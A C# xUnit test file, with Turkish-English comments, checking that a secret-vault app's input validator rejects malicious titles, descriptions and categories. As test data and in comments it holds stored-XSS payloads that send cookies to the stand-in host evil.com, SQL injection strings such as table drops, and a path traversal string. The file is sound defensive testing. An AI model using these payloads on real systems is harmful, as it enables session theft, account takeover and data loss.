using System;
using FluentAssertions;
using FluentValidation.TestHelper;
using VaultGuard.Application.DTOs.Secrets;
using VaultGuard.Application.Validators;
using Xunit;

namespace VaultGuard.Application.Tests.Validators;

/// <summary>
/// TEST SÜİTİ: CreateSecretDtoValidator - Secret Oluşturma Input Validation (KRİTİK!)
/// 
/// GÜVENLİK KAPSAMI:
/// - **STORED XSS**: Title/Description'da script injection engelleme
/// - **SQL Injection**: Title'da SQL keyword detection
/// - **DoS Prevention**: 10KB RawValue limit, 1000 char Description limit
/// - **Mandatory Fields**: RawValue (hassas veri) ve Title zorunlu
/// - **Data Integrity**: Expiration date validation (future dates only)
/// 
/// THREAT MODEL - STORED XSS (EN YÜKSEK RİSK):
/// Saldırgan bir secret oluşturur:
/// Title: "AWS Key <script>fetch('http://evil.com?cookie='+document.cookie)</script>"
/// 
/// Bu secret başka bir user tarafından görüntülendiğinde:
/// 1. Script execute edilir (XSS)
/// 2. User'ın session cookie'si çalınır
/// 3. Attacker user'ın account'ına erişir
/// 4. Tüm secret'ları decrypt edebilir (CRITICAL DATA BREACH)
/// 
/// Stored XSS, Reflected XSS'den daha tehlikelidir çünkü:
/// - Database'de persist edilir
/// - Tüm user'ları etkiler
/// - Uzun süre fark edilmez
/// 
/// COMPLIANCE:
/// - OWASP Top 10 A03:2021 - Injection (SQL + XSS)
/// - PCI-DSS 6.5.7 - XSS prevention
/// - SOC 2 CC6.1 - Logical access controls
/// </summary>
public class CreateSecretDtoValidatorTests
{
    private readonly CreateSecretDtoValidator _validator;

    public CreateSecretDtoValidatorTests()
    {
        _validator = new CreateSecretDtoValidator();
    }

    // ============================================================================
    // ✅ VALID SECRET CREATION SCENARIOS
    // ============================================================================

    /// <summary>
    /// SİBER GÜVENLİK NOTU:
    /// Baseline test - valid data'nın geçmesi şart. False positive'ler
    /// legitimate user'ları engeller ve UX'i bozar.
    /// </summary>
    [Fact]
    public void Validate_WithValidSecretData_ShouldPass()
    {
        // Arrange
        var dto = new CreateSecretDto
        {
            Title = "AWS Production API Key",
            RawValue = "sk-proj-abc123XYZ789",
            Description = "API key for S3 access",
            Category = "API Keys",
            ExpiresAt = DateTime.UtcNow.AddDays(90)
        };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldNotHaveAnyValidationErrors();
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU:
    /// Minimal required fields - Description, Category, ExpiresAt optional.
    /// Mandatory: Title (identifier) + RawValue (actual secret).
    /// </summary>
    [Fact]
    public void Validate_WithOnlyRequiredFields_ShouldPass()
    {
        // Arrange
        var dto = new CreateSecretDto
        {
            Title = "Database Password",
            RawValue = "MyS3cur3P@ssw0rd!"
            // Description, Category, ExpiresAt null
        };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldNotHaveAnyValidationErrors();
    }

    // ============================================================================
    // 📝 TITLE VALIDATION TESTS
    // ============================================================================

    /// <summary>
    /// SİBER GÜVENLİK NOTU - KRİTİK:
    /// Empty title bypass'i:
    /// 1. User experience: Secret'leri ayırt edemez (identification loss)
    /// 2. Database integrity: NULL titles query'lerde sorun yaratır
    /// 3. Audit logs: "User accessed secret: <empty>" - meaningless log
    /// 4. Authorization: Title-based access control fail edebilir
    /// </summary>
    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("   ")]
    public void Validate_WithNullOrEmptyTitle_ShouldFail(string invalidTitle)
    {
        // Arrange
        var dto = CreateValidDto();
        dto = dto with { Title = invalidTitle };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldHaveValidationErrorFor(x => x.Title);
            
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - UX & DATA QUALITY:
    /// 2-char title (min 3) - çok kısa title'lar:
    /// 1. Typo olabilir (user "AB" yerine "AWS" yazacaktı)
    /// 2. Search/filter'da sorun (single-letter secrets bulması zor)
    /// 3. Collision risk: Çok user "DB" title'ı kullanırsa karışır
    /// </summary>
    [Theory]
    [InlineData("AB")] // 2 chars
    [InlineData("A")] // 1 char
    public void Validate_WithTitleTooShort_ShouldFail(string shortTitle)
    {
        // Arrange
        var dto = CreateValidDto();
        dto = dto with { Title = shortTitle };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldHaveValidationErrorFor(x => x.Title);
            
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - DoS PREVENTION:
    /// 201-char title (max 200) - attacker 1MB title gönderirse:
    /// 1. Database storage bloat (VARCHAR(200) overflow)
    /// 2. UI rendering issues (long strings break layout)
    /// 3. Export/download issues (CSV file corruption)
    /// 4. Index performance degradation
    /// </summary>
    [Fact]
    public void Validate_WithTitleTooLong_ShouldFail()
    {
        // Arrange: 201 chars (max 200)
        var longTitle = new string('A', 201);

        var dto = CreateValidDto();
        dto = dto with { Title = longTitle };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldHaveValidationErrorFor(x => x.Title);
            
    }

    // ============================================================================
    // 🚨 STORED XSS TESTS (TITLE) - KRİTİK!
    // ============================================================================

    /// <summary>
    /// SİBER GÜVENLİK NOTU - STORED XSS KRİTİK SALDIRI:
    /// Classic XSS payload'lar - Bu payload'lar database'e yazılır ve
    /// secret görüntülendiğinde execute edilir:
    /// 
    /// Saldırı senaryosu:
    /// 1. Attacker secret oluşturur: Title = "<script>alert(1)</script>"
    /// 2. Secret database'e kaydedilir (encrypted value + XSS title)
    /// 3. Victim user secret listesini görüntüler
    /// 4. XSS payload execute edilir:
    ///    - Session cookie çalınır: document.cookie
    ///    - Keylogger yüklenir: document.addEventListener('keypress')
    ///    - Phishing: Fake login form inject edilir
    /// 5. Attacker victim'in account'ına full access kazanır
    /// 6. Tüm secret'ları decrypt eder (AES key'e erişir)
    /// 
    /// Impact: CRITICAL - Tüm sistem compromise olabilir.
    /// </summary>
    [Theory]
    [InlineData("<script>alert('XSS')</script>")]
    [InlineData("<script>fetch('http://evil.com?c='+document.cookie)</script>")]
    [InlineData("<img src=x onerror=alert('XSS')>")]
    [InlineData("<svg/onload=alert('XSS')>")]
    [InlineData("<iframe src='javascript:alert(1)'>")]
    [InlineData("<body onload=alert('XSS')>")]
    public void Validate_WithXssInTitle_ShouldFail(string xssTitle)
    {
        // Arrange
        var dto = CreateValidDto();
        dto = dto with { Title = xssTitle };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert: XSS payload MUTLAKA reddedilmeli
        result.ShouldHaveValidationErrorFor(x => x.Title);
            
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - ADVANCED XSS BYPASS:
    /// Obfuscated XSS - Attacker basit XSS detection'ı bypass etmeye çalışır:
    /// 
    /// 1. <ScRiPt> - Mixed case bypass
    /// 2. <scr<script>ipt> - Tag injection inside tag
    /// 3. javascript:alert(1) - Protocol-based XSS
    /// 4. onerror= - Event handler XSS
    /// 5. <object> - Alternate tags
    /// 
    /// Regex pattern case-insensitive ve multiple tag types desteklemeli.
    /// </summary>
    [Theory]
    [InlineData("<ScRiPt>alert(1)</ScRiPt>")] // Mixed case
    [InlineData("javascript:alert(1)")] // Protocol XSS
    [InlineData("<object data='javascript:alert(1)'>")] // Object tag
    [InlineData("<embed src='javascript:alert(1)'>")] // Embed tag
    [InlineData("<link rel='stylesheet' href='javascript:alert(1)'>")] // Link tag
    [InlineData("<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>")] // Meta redirect
    [InlineData("<style>@import'javascript:alert(1)';</style>")] // Style import
    public void Validate_WithObfuscatedXssInTitle_ShouldFail(string obfuscatedXss)
    {
        // Arrange
        var dto = CreateValidDto();
        dto = dto with { Title = obfuscatedXss };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldHaveValidationErrorFor(x => x.Title);
            
    }

    // ============================================================================
    // 🛡️ SQL INJECTION TESTS (TITLE)
    // ============================================================================

    /// <summary>
    /// SİBER GÜVENLİK NOTU - SQL INJECTION DEFENSE-IN-DEPTH:
    /// SQL keywords in title - EF Core parameterized queries kullanır AMA:
    /// 
    /// Defense-in-depth senaryoları:
    /// 1. Raw SQL query'leri (legacy code)
    /// 2. Stored procedures (dynamic SQL)
    /// 3. Full-text search queries (LIKE statements)
    /// 4. Export/report generation (raw SQL)
    /// 5. Third-party library vulnerabilities
    /// 
    /// Örnek vulnerable query:
    /// var sql = "SELECT * FROM Secrets WHERE Title LIKE '%" + dto.Title + "%'";
    /// Title = "'; DROP TABLE Secrets; --" → SQL Injection!
    /// 
    /// Validation ek bir savunma katmanı sağlar.
    /// </summary>
    [Theory]
    [InlineData("AWS Key'; DROP TABLE Secrets; --")]
    [InlineData("Key' OR '1'='1")]
    [InlineData("Secret' UNION SELECT * FROM Users--")]
    [InlineData("Password'; DELETE FROM Secrets WHERE '1'='1")]
    public void Validate_WithSqlInjectionInTitle_ShouldFail(string sqlInjectionTitle)
    {
        // Arrange
        var dto = CreateValidDto();
        dto = dto with { Title = sqlInjectionTitle };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert: SQL keywords detected
        result.ShouldHaveValidationErrorFor(x => x.Title);
            
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - WHITESPACE NORMALIZATION:
    /// Leading/trailing whitespace - " AWS Key  " problematic:
    /// 1. Duplicate detection fail eder (trim edilmezse farklı kayıt)
    /// 2. Search sonuçlarında görünmez (leading space)
    /// 3. UI rendering issues (unnecessary spaces)
    /// 4. Export/CSV parsing issues
    /// 
    /// Best practice: Always trim user input.
    /// </summary>
    [Fact]
    public void Validate_WithWhitespaceInTitle_ShouldFail()
    {
        // Arrange: Leading/trailing spaces
        var dto = CreateValidDto();
        dto = dto with { Title = "  AWS Key  " };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldHaveValidationErrorFor(x => x.Title);
            
    }

    // ============================================================================
    // 🔐 RAW VALUE (PLAINTEXT SECRET) VALIDATION TESTS
    // ============================================================================

    /// <summary>
    /// SİBER GÜVENLİK NOTU - MANDATORY SENSITIVE DATA:
    /// Empty RawValue bypass'i:
    /// 1. Secret without value = meaningless data (waste of storage)
    /// 2. Encryption failure: AES encrypt(empty) = unexpected behavior
    /// 3. Decryption issues: decrypt(empty cipher) = crash/exception
    /// 4. Business logic: Secret'in değeri olmalı (core requirement)
    /// 
    /// Empty secret'ler database'i kirletir ve sistem instability yaratır.
    /// </summary>
    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("   ")]
    public void Validate_WithNullOrEmptyRawValue_ShouldFail(string invalidRawValue)
    {
        // Arrange
        var dto = CreateValidDto();
        dto = dto with { RawValue = invalidRawValue };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldHaveValidationErrorFor(x => x.RawValue);
            
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - DoS PREVENTION KRİTİK:
    /// 10001-char RawValue (max 10000 = 10KB) - Attacker 1GB secret gönderirse:
    /// 
    /// Attack scenario:
    /// 1. Memory exhaustion: Server 1GB string'i memory'ye alır → OOM crash
    /// 2. Encryption DoS: AES-256 1GB'ı encrypt ederken CPU %100 → timeout
    /// 3. Database bloat: 1 million users × 1GB secret = 1 Petabyte storage
    /// 4. Backup issues: Database backup 1PB olur → impossible
    /// 5. Network saturation: 1GB secret transfer → bandwidth tüketir
    /// 
    /// 10KB limit:
    /// - API key'ler: ~100 bytes
    /// - Passwords: ~50 bytes
    /// - JWT tokens: ~1-2 KB
    /// - SSL private keys: ~3KB
    /// - 10KB çoğu use case için yeterli
    /// 
    /// Impact: DoS attack prevention (CRITICAL)
    /// </summary>
    [Fact]
    public void Validate_WithRawValueTooLong_ShouldFail()
    {
        // Arrange: 10001 chars (max 10000)
        var hugeSecret = new string('A', 10001);

        var dto = CreateValidDto();
        dto = dto with { RawValue = hugeSecret };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldHaveValidationErrorFor(x => x.RawValue);
            
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - DATA QUALITY:
    /// Whitespace-only secret - "    " (4 spaces):
    /// 1. User error: Copy-paste accident (clipboard boş)
    /// 2. Encryption waste: AES encrypt(whitespace) = unnecessary
    /// 3. Decryption confusion: decrypt → whitespace → user "nerede secret?"
    /// 4. Audit logs: "User decrypted whitespace" = meaningless event
    /// 
    /// Whitespace-only input reject edilmeli (trim after check).
    /// </summary>
    [Fact]
    public void Validate_WithWhitespaceOnlyRawValue_ShouldFail()
    {
        // Arrange: Only spaces
        var dto = CreateValidDto();
        dto = dto with { RawValue = "        " };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldHaveValidationErrorFor(x => x.RawValue);
            
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - VARIOUS SECRET TYPES:
    /// Different secret formats - validation format-agnostic olmalı:
    /// 1. API keys: "sk-proj-abc123..."
    /// 2. Passwords: "MyP@ssw0rd!"
    /// 3. JWT: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
    /// 4. SSH keys: "-----BEGIN RSA PRIVATE KEY-----\n..."
    /// 5. Credit cards: "4532-1488-0343-6467"
    /// 
    /// Validator specific format enforce etmemeli (flexibility).
    /// </summary>
    [Theory]
    [InlineData("sk-proj-abc123XYZ789")] // API key format
    [InlineData("MyP@ssw0rd!123")] // Password format
    [InlineData("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0")] // JWT
    [InlineData("-----BEGIN RSA PRIVATE KEY-----\nMIIBOgIBAAJB...")] // SSH key
    [InlineData("4532-1488-0343-6467")] // Credit card (test number)
    public void Validate_WithVariousSecretFormats_ShouldPass(string secretValue)
    {
        // Arrange
        var dto = CreateValidDto();
        dto = dto with { RawValue = secretValue };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert: Format-agnostic validation
        result.ShouldNotHaveValidationErrorFor(x => x.RawValue);
    }

    // ============================================================================
    // 📄 DESCRIPTION VALIDATION TESTS (Optional Field)
    // ============================================================================

    /// <summary>
    /// SİBER GÜVENLİK NOTU - DoS PREVENTION:
    /// 1001-char description (max 1000) - long descriptions:
    /// 1. Database bloat (TEXT column abuse)
    /// 2. UI rendering lag (long text rendering slow)
    /// 3. Export file size explosion (CSV/JSON exports huge)
    /// 4. Search index bloat (full-text search performance)
    /// </summary>
    [Fact]
    public void Validate_WithDescriptionTooLong_ShouldFail()
    {
        // Arrange: 1001 chars (max 1000)
        var longDescription = new string('A', 1001);

        var dto = CreateValidDto();
        dto = dto with { Description = longDescription };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldHaveValidationErrorFor(x => x.Description);
            
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - STORED XSS IN DESCRIPTION:
    /// XSS payload in description - Description also displayed in UI:
    /// 
    /// Attack scenario:
    /// 1. Attacker creates secret with XSS in description
    /// 2. Victim views secret details page
    /// 3. Description rendered: "<p>{description}</p>" (no escaping!)
    /// 4. XSS executes: Cookie theft, session hijacking, phishing
    /// 
    /// Description field ALSO needs XSS protection (like Title).
    /// </summary>
    [Theory]
    [InlineData("<script>document.location='http://evil.com?c='+document.cookie</script>")]
    [InlineData("<img src=x onerror='fetch(\"http://evil.com/steal?c=\"+document.cookie)'>")]
    [InlineData("Normal text <svg/onload=alert(document.domain)>")]
    public void Validate_WithXssInDescription_ShouldFail(string xssDescription)
    {
        // Arrange
        var dto = CreateValidDto();
        dto = dto with { Description = xssDescription };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldHaveValidationErrorFor(x => x.Description);
            
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - NULL DESCRIPTION IS VALID:
    /// Description optional - null/empty OK:
    /// 1. User may not want to add notes (quick secret creation)
    /// 2. Forcing description = bad UX
    /// 3. Empty description ≠ security risk
    /// 
    /// Optional fields validation: Only validate if provided.
    /// </summary>
    [Fact]
    public void Validate_WithNullDescription_ShouldPass()
    {
        // Arrange
        var dto = CreateValidDto();
        dto = dto with { Description = null };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert: Description optional
        result.ShouldNotHaveValidationErrorFor(x => x.Description);
    }

    // ============================================================================
    // 🏷️ CATEGORY VALIDATION TESTS (Optional Field)
    // ============================================================================

    /// <summary>
    /// SİBER GÜVENLİK NOTU - DoS PREVENTION:
    /// 51-char category (max 50) - categories should be concise:
    /// 1. UI dropdown overflow (long category names break layout)
    /// 2. Database index bloat (category indexed for search)
    /// 3. Filter performance (WHERE category = 'long_string' slow)
    /// </summary>
    [Fact]
    public void Validate_WithCategoryTooLong_ShouldFail()
    {
        // Arrange: 51 chars (max 50)
        var longCategory = new string('A', 51);

        var dto = CreateValidDto();
        dto = dto with { Category = longCategory };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldHaveValidationErrorFor(x => x.Category);
            
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - ALPHANUMERIC CONSTRAINT:
    /// Invalid category characters - Categories identifier-like olmalı:
    /// 1. SQL injection risk: Category'de ' veya ; olursa dangerous
    /// 2. XSS risk: Category dropdown'da <script> inject edilirse
    /// 3. File system: Category export file name olursa / \ risk
    /// 
    /// Allowed: letters, numbers, spaces, hyphens, underscores only.
    /// </summary>
    [Theory]
    [InlineData("API Keys!@#")] // Special chars
    [InlineData("Keys<script>")] // XSS attempt
    [InlineData("Keys'; DROP TABLE")] // SQL injection
    [InlineData("../../../etc/passwd")] // Path traversal
    public void Validate_WithInvalidCategoryCharacters_ShouldFail(string invalidCategory)
    {
        // Arrange
        var dto = CreateValidDto();
        dto = dto with { Category = invalidCategory };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldHaveValidationErrorFor(x => x.Category);
            
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - VALID CATEGORY FORMATS:
    /// Common category patterns - alphanumeric, spaces, hyphens OK:
    /// 1. "API Keys" - Standard
    /// 2. "SSH-Keys" - Hyphenated
    /// 3. "oauth_tokens" - Underscored
    /// 4. "2FA Codes" - Numbers + letters
    /// </summary>
    [Theory]
    [InlineData("API Keys")]
    [InlineData("SSH-Keys")]
    [InlineData("oauth_tokens")]
    [InlineData("2FA Codes")]
    [InlineData("Database Credentials")]
    public void Validate_WithValidCategoryFormats_ShouldPass(string validCategory)
    {
        // Arrange
        var dto = CreateValidDto();
        dto = dto with { Category = validCategory };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldNotHaveValidationErrorFor(x => x.Category);
    }

    // ============================================================================
    // ⏰ EXPIRATION DATE VALIDATION TESTS (Optional Field)
    // ============================================================================

    /// <summary>
    /// SİBER GÜVENLİK NOTU - TIME MANIPULATION ATTACK:
    /// Past expiration date - Attacker geçmiş tarih gönderirse:
    /// 1. Secret immediately expired → unusable
    /// 2. Audit logs confusing: "Secret created as expired"
    /// 3. Business logic bypass: Expiration check atlanabilir
    /// 
    /// Expiration MUTLAKA future date olmalı (> DateTime.UtcNow).
    /// </summary>
    [Fact]
    public void Validate_WithPastExpirationDate_ShouldFail()
    {
        // Arrange: Yesterday
        var dto = CreateValidDto();
        dto = dto with { ExpiresAt = DateTime.UtcNow.AddDays(-1) };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldHaveValidationErrorFor(x => x.ExpiresAt);
            
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - UNREALISTIC DATES:
    /// 11-year expiration (max 10 years) - çok uzun expiration:
    /// 1. Data retention policy violation (GDPR: data minimize)
    /// 2. Security risk: Long-lived secrets = higher breach risk
    /// 3. Compliance: PCI-DSS max 90 days for privileged credentials
    /// 4. Business logic: 100 yıl expiration = effectively never expires
    /// 
    /// 10-year limit reasonable (covers long-term SSL certs vb.).
    /// </summary>
    [Fact]
    public void Validate_WithUnrealisticExpirationDate_ShouldFail()
    {
        // Arrange: 11 years (max 10)
        var dto = CreateValidDto();
        dto = dto with { ExpiresAt = DateTime.UtcNow.AddYears(11) };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldHaveValidationErrorFor(x => x.ExpiresAt);
            
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - NULL EXPIRATION IS VALID:
    /// No expiration date - Bazı secret'ler expiration gerektirmez:
    /// 1. Master encryption keys (system-wide, manuel rotate)
    /// 2. Development API keys (test environment)
    /// 3. Personal passwords (user discretion)
    /// 
    /// Expiration optional ama recommended (security best practice).
    /// </summary>
    [Fact]
    public void Validate_WithNullExpiration_ShouldPass()
    {
        // Arrange
        var dto = CreateValidDto();
        dto = dto with { ExpiresAt = null };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert: No expiration is allowed
        result.ShouldNotHaveValidationErrorFor(x => x.ExpiresAt);
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - VALID EXPIRATION RANGE:
    /// Tomorrow to 10 years - Reasonable expiration range:
    /// 1. Short-term: 1 day (temporary access tokens)
    /// 2. Medium-term: 90 days (API keys, passwords)
    /// 3. Long-term: 1-2 years (SSL certificates)
    /// 4. Max: 10 years (government certificates, etc.)
    /// </summary>
    [Theory]
    [InlineData(1)] // Tomorrow
    [InlineData(30)] // 1 month
    [InlineData(90)] // 3 months (recommended)
    [InlineData(365)] // 1 year
    [InlineData(730)] // 2 years
    [InlineData(3650)] // 10 years (max)
    public void Validate_WithVariousValidExpirationDays_ShouldPass(int daysFromNow)
    {
        // Arrange
        var dto = CreateValidDto();
        dto = dto with { ExpiresAt = DateTime.UtcNow.AddDays(daysFromNow) };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldNotHaveValidationErrorFor(x => x.ExpiresAt);
    }

    // ============================================================================
    // 🧪 EDGE CASES & BOUNDARY TESTS
    // ============================================================================

    /// <summary>
    /// SİBER GÜVENLİK NOTU - EXACTLY AT BOUNDARY:
    /// Exactly 3-char title (min boundary) - boundary values geçmeli:
    /// 1. Off-by-one errors yaygındır (< vs <=)
    /// 2. "ABC" geçerli mi? Test etmeden bilinmez
    /// 3. Boundary testing: min, min+1, max-1, max değerleri test et
    /// </summary>
    [Fact]
    public void Validate_WithExactly3CharTitle_ShouldPass()
    {
        // Arrange: Minimum length (3 chars)
        var dto = CreateValidDto();
        dto = dto with { Title = "AWS" };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldNotHaveValidationErrorFor(x => x.Title);
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - EXACTLY AT BOUNDARY:
    /// Exactly 200-char title (max boundary) - max limit geçmeli:
    /// 1. VARCHAR(200) column'a 200 char sığmalı
    /// 2. UI max-length attribute match etmeli
    /// 3. Edge case: 200 char tam sınırda geçerli
    /// </summary>
    [Fact]
    public void Validate_WithExactly200CharTitle_ShouldPass()
    {
        // Arrange: Maximum length (200 chars)
        var dto = CreateValidDto();
        dto = dto with { Title = new string('A', 200) };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldNotHaveValidationErrorFor(x => x.Title);
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - EXACTLY AT BOUNDARY:
    /// Exactly 10000-char RawValue (max boundary) - 10KB limit:
    /// 1. AES-256 10KB'ı encrypt edebilmeli
    /// 2. Database BLOB column 10KB store edebilmeli
    /// 3. Network: 10KB HTTP POST sınırında (usually OK)
    /// </summary>
    [Fact]
    public void Validate_WithExactly10000CharRawValue_ShouldPass()
    {
        // Arrange: Maximum RawValue length (10KB)
        var dto = CreateValidDto();
        dto = dto with { RawValue = new string('X', 10000) };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldNotHaveValidationErrorFor(x => x.RawValue);
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - MULTIPLE VALIDATION ERRORS:
    /// All fields invalid - validator tüm hataları dönmeli:
    /// 1. User experience: Tek tek düzeltmek yerine tüm hataları göster
    /// 2. Debugging: Birden fazla sorun varsa hepsini raporla
    /// 3. Fail-fast değil fail-comprehensive yaklaşım
    /// </summary>
    [Fact]
    public void Validate_WithAllFieldsInvalid_ShouldHaveMultipleErrors()
    {
        // Arrange: Tüm alanlar invalid
        var dto = new CreateSecretDto
        {
            Title = "", // Empty
            RawValue = "", // Empty
            Description = new string('X', 1001), // Too long
            Category = "Invalid!@#", // Invalid chars
            ExpiresAt = DateTime.UtcNow.AddYears(-1) // Past date
        };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert: Multiple errors
        result.ShouldHaveValidationErrorFor(x => x.Title);
        result.ShouldHaveValidationErrorFor(x => x.RawValue);
        result.ShouldHaveValidationErrorFor(x => x.Description);
        result.ShouldHaveValidationErrorFor(x => x.Category);
        result.ShouldHaveValidationErrorFor(x => x.ExpiresAt);

        result.Errors.Count.Should().BeGreaterThanOrEqualTo(5);
    }

    // ============================================================================
    // HELPER METHODS
    // ============================================================================

    private CreateSecretDto CreateValidDto()
    {
        return new CreateSecretDto
        {
            Title = "Test Secret",
            RawValue = "test_secret_value_123",
            Description = "Test description",
            Category = "Test Category",
            ExpiresAt = DateTime.UtcNow.AddDays(90)
        };
    }
}